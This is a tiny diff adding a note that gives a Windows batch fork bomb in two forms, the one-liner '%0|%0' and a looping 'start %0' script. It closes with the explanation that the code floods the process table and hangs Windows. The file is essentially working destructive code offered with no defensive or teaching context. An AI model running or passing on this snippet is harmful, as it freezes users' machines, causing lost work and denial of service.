@@ -1,0 +1,12 @@
+%0|%0   // its percentage zero pipe percenatge zero
+
+
+also written as
+
+:s
+start %0
+goto s
+
+
+
+This code creates a large number of processes very quickly in order to saturate the process table of windows. It will just hang the windows.
